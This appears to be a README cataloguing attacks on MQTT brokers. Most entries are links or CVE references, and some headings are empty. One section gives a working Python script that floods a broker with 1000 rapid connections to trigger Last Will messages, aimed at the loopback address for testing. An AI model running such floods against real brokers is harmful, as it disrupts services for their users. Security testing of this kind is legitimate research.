# MQTT Attacks

## SlowITe and Unauthorized Sub/Pub Flooding
https://github.com/gianluca2414/MQTT_SlowITe

## SlowTT
https://github.com/GenjiM1n4moto/SlowTT-Attack

## Connect Flooding
https://github.com/gianluca2414/MQTT_SlowITe

The attack mechanism involves dispatching a surge of MQTT CONNECT packets, which are the initial packets in the MQTT protocol used to establish a connection between the client and the broker.

## Last Will Payload

The attack mechanism simulates a test condition for the broker to handle connections and Last Will messages from a large number of clients rapidly connecting and disconnecting. 

### Requirements
+ This attack is simulated using `Python 3.11.8`.
+ In the attack, three libraries are imported
    * `paho.mqtt.client`: This library is essential for MQTT communication, enabling the creation and management of MQTT client connections, publishing messages, and subscribing to topics. To install this module click [hier](https://eclipse.dev/paho/index.php?page=clients/python/index.php).
    * `time`: This standard Python library is used for its sleep function, which introduces delays in this case, 0.1 seconds between client connections and disconnections, effectively simulating rapid client turnover and testing the broker's handling of last will messages.
    * `random`: The library is also imported but not used in the given code snippet
### Exploit    
```python
import random
import paho.mqtt.client as mqtt
import time

def connect_client(client_id, will_topic, broker_address="127.0.0.1"):
    client = mqtt.Client(client_id)
    client.will_set(will_topic, payload="Last Will Message", qos=1, retain=False)
    client.connect(broker_address, 1883, 60)
    return client

def main():
    broker_address = "127.0.0.1"
    will_topic = "test/lastwill"

    clients = []
    try:
        for i in range(1000):  # range for the flooding effect
            client_id = f"Client_{i}"
            client = connect_client(client_id, will_topic, broker_address)
            clients.append(client)
            # disconnect after 0.1 connecting to trigger the Last Will message
            time.sleep(0.1)
            client.disconnect()
    finally:
        for client in clients:
            client.loop_stop()

if __name__ == '__main__':
    main()
```
The function `connect_client()` takes the parameters `client_id`, `will_topic`, and `broker_address`. It creates an MQTT client with a unique ID and sets up a last will message on `will_topic`, In the `will_set` method, the `qos` parameter is set to `1`. This ensures that messages are delivered at least once and the `retain` flag is set to `False`,means the broker does not retain the message. Finally, it connects to the broker at the loopback address using the default MQTT port. Iterates to create 1000 clients. Each client is connected and then quickly disconnected after a 0.1-second pause, triggering the broker to send the last will message.

## ACK-PSH Flooding
https://github.com/uiucseclab/460FinalDDoSAttacks

## Non-MQTT Protocol Based Requests

## HTTP Requests Misinterpreted

## UDP MQTT Requests

## Cross-Topic Type Requests

## Payload Remaining Length
MQTT Payload Remaining Length (CVE-2018-17614)

## Unicode Handling in Topic Strings
MQTT Unicode Handling in Topic Strings (CVE-2017-7653)

## URI-Style Topic Validation
MQTT URI-Style Topic Validation (CVE-2018-11615)

## Brute-Force
https://github.com/stfbk/mqttsa?tab=readme-ov-file

## Topic enumeration
https://book.hacktricks.xyz/network-services-pentesting/1883-pentesting-mqtt-mosquitto

## Elevation of Privilege (EoP)
https://book.hacktricks.xyz/network-services-pentesting/1883-pentesting-mqtt-mosquitto

## OpenSSL Infinite Loop
Openssl infinite loop DoS vulnerability, CVE-2022-0778

## Note
Loopback IP